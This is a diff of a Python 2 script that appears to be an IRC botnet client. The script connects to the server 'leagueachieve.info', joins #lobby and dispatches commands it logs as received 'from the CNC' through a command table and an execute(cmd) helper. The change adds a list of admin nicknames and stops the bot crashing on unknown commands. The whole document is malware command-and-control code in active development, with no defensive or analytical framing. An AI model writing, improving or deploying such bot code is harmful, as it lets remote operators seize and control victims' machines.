@@ -28,6 +28,7 @@ def execute(cmd):
 	return output.strip('\n');
 
 #IRC Settings
+admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 channel = "#lobby"
 botnick = genNick()
@@ -63,19 +64,20 @@ commands = {
 
 #function which parses the command and determine how to handle it
 def parseCommand(command):
-	#have to actually parse the text and find the command.
+	print "given '%s'" % command
 	arg = "PRIVMSG"
 	if (arg in command):
 		tempCommand = command[command.index(arg):]
-		finalCommand = tempCommand[(tempCommand.index(':') + 1):]
-		command = finalCommand.strip().lower()
+		command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
 		
 		print "Recieved %s from the CNC" % command
-		commands[command]()
-		print "function called"
+		if command in commands.keys():
+			commands[command]()
+			print "function called"
+		else:
+			print "command '%s' not defined" % command
 
 
-#THIS SECTION IS FOR CONNECTION TO THE SERVER
 #Connecting to the IRC Server
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
 print "connecting to: "+server
